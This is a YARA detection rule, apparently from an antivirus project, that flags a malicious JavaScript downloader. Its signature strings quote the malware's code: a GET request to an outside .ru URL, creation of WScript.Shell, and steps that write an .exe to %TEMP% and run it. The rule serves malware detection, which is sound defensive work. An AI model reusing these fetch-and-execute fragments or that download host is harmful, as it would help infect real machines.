rule sig_20160330_c6bd58a798084c8a16edfa98d2cff01d {
  meta:
    description = "datamaliciousorder - file 20160330_c6bd58a798084c8a16edfa98d2cff01d.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "aee891811e9e753d401dc004bd22ce7d6d9e136f7c8cacd3794b6aafc19c7ed1"

  strings:
    $s1  = "V[K](\"GET\", \"http://buketrose.ru/h3sia\", false);" fullword ascii
    $s2  = "var T = function UP() {return WScript[YD](\"WScript\"+\".Shell\");}(), O = 11;" fullword ascii
    $s3  = "function DC(Y, P){J = J * 1; return Y - P;};" fullword ascii
    $s4  = "if (V[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function MH() {return T[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"xQKWZ5Gb.ex\" + \"e\";};" fullword ascii
    $s6  = "function RH(){return RZ + \"\";};" fullword ascii
    $s7  = "function N(A0){T[\"Run\"](A0, J, J);};" fullword ascii
    $s8  = "function CH() {return ((WZ == true) && (WZ == W)) ? 1 : J;};" fullword ascii
    $s9  = "function A(){return 22;};" fullword ascii
    $s10 = "var F = new this[\"Date\"]();" fullword ascii
    $s11 = "}while (KJ);" fullword ascii
    $s12 = "return DC(F0, C0);" fullword ascii
    $s13 = "function ML(NQ) {var NC = (1, 2, 3, 4, 5, NQ); return NC;};" fullword ascii
    $s14 = "function B(){return YD;};" fullword ascii
    $s15 = "function TY()" fullword ascii
    $s16 = "var W = false;" fullword ascii
    $s17 = "W = true; " fullword ascii
    $s18 = "var WZ = false;" fullword ascii
    $s19 = "WZ = true; " fullword ascii
    $s20 = "} catch(QP){};};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}